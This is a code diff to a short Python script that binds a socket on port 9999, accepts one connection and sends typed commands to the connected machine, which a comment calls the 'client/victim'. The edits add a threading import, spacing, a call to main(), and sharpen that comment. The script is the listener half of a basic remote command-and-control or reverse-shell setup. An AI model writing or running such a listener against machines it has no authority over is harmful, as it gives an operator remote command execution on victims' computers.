@@ -1,5 +1,6 @@
 import socket
 import sys
+import threading
 
 #create an INET, STREAMing socket
 def create_socket():
@@ -10,6 +11,7 @@ def create_socket():
         host = ""
         port = 9999 # Port to listen on (non-privileged ports are > 1023)
         s = socket.socket()
+
     except socket.error as msg:
         print("Socket creation error: " + str(msg)) # Print error message
 
@@ -20,8 +22,10 @@ def bind_socket():
         global port
         global s
         print("Binding the Port: " + str(port)) # Print port number
+
         s.bind((host, port)) # Bind to the port
         s.listen(5) # Listen up to 5 connections
+
     except socket.error as msg:
         print("Socket Binding error: " + str(msg) + "\n" + "Retrying...") # Print error message
         bind_socket() # Recursion
@@ -33,7 +37,7 @@ def socket_accept():
     send_commands(conn) # Send commands
     conn.close() # Close connection
 
-# Send commands to client/victim or a friend
+# Send commands to client/victim
 def send_commands(conn):
     while True:
         cmd = input() # Take input
@@ -50,3 +54,5 @@ def main():
     create_socket()
     bind_socket()
     socket_accept()
+
+main()
